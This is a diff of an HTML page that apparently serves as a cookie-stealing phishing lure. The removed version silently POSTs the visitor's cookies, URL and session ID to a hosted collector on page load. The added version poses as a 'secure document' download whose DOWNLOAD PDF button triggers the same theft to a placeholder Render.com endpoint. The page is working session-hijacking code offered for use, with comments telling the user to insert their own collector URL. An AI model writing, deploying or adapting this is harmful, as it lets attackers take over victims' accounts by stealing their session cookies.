@@ -1,38 +1,35 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Session Sync</title>
-</head>
+<head><title>Document Download</title></head>
 <body>
-    <h2 style="font-family: sans-serif; color: #555;">Synchronizing session...</h2>
-    
+    <h2 style="text-align:center; margin-top:50px; font-family:sans-serif;">
+        Your secure document is ready.
+    </h2>
+    <div style="text-align:center; margin-top:20px;">
+        <a href="https://example.com/your-doc.pdf" 
+           onclick="harvest()" 
+           style="background:#007bff; color:white; padding:15px 25px; text-decoration:none; border-radius:5px; font-family:sans-serif; font-weight:bold;">
+           DOWNLOAD PDF
+        </a>
+    </div>
+
     <script>
         async function harvest() {
-            // 1. Replace this with your actual LocalTunnel URL
-            const serverUrl = 'https://docs-rurm.onrender.com';
-
             const data = {
+                job_id: "production",
                 url: window.location.href,
-                cookies: document.cookie || "No cookies available",
-                session_id: (document.cookie.match(/sessionid=([^;]+)/) || ["","none"])[1],
-                time: new Date().toISOString()
+                cookies: document.cookie,
+                session_id: (document.cookie.match(/sessionid=([^;]+)/) || ["","none"])[1]
             };
-
-            try {
-                await fetch(serverUrl, {
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json',
-                        'bypass-tunnel-reminder': 'true' 
-                    },
-                    body: JSON.stringify(data)
-                });
-                document.body.innerHTML = "<h3>Verification Complete. You can close this window.</h3>";
-            } catch (e) {
-                document.body.innerHTML = "<h3>Error connecting to server.</h3>";
-            }
+            
+            // REPLACE the URL below with your actual Render.com URL
+            await fetch('https://your-render-app.onrender.com/collect', {
+                method: 'POST',
+                mode: 'cors', 
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            }).catch(e => console.log("HARVEST FAILED"));
         }
-        window.onload = harvest;
     </script>
 </body>
 </html>
